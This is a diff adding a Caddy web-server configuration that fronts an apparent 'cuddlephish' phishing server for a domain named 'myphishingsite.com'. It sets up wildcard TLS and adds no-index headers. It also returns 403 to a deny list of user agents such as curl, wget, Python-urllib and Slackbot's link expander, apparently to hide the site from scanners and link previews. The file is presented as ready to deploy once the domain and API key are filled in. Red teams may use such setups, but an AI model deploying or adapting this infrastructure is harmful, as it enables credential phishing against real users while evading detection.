@@ -1,0 +1,45 @@
+(proxy_upstream) {
+	# Enable access logging to STDOUT
+	log
+
+	# This is our list of naughty client User Agents that we don't want sniffing around our website
+	@ua_denylist {
+		header User-Agent curl*
+		header User-Agent Simple*
+		header User-Agent BBBike*
+		header User-Agent wget*
+		header User-Agent jorgee*
+		header User-Agent Python-urllib*
+		header User-Agent Lynx*
+		header User-Agent Slackbot-LinkExpanding*
+	}
+
+	header {
+		-Server
+		+X-Robots-Tag "noindex, nofollow, nosnippet, noarchive"
+		+X-Content-Type-Options "nosniff"
+	}
+
+	# Respond with a 403 if the client has a User Agent defined in our naughty list
+	# Lot more you can do with this (e.g. redirect to seperate domain), check the docs
+	respond @ua_denylist "Forbidden" 403 {
+		close
+	}
+
+	# Main reverse proxy setup to our cuddlephish server binding 58082
+	reverse_proxy localhost:58082 {
+		header_up Host {host}
+		header_up X-Real-IP {remote_host}
+		header_up X-Forwarded-For {remote_host}
+		header_up X-Forwarded-Proto {scheme}
+	}
+}
+
+#!!!JUST MODIFY THE DOMAIN AND API KEY BELOW!!!
+myphishingsite.com *.myphishingsite.com {
+	tls {
+		dns gandi GANDI_API_KEY
+	}
+	# Use the proxy_upstream code snippet (defined above)
+	import proxy_upstream
+}
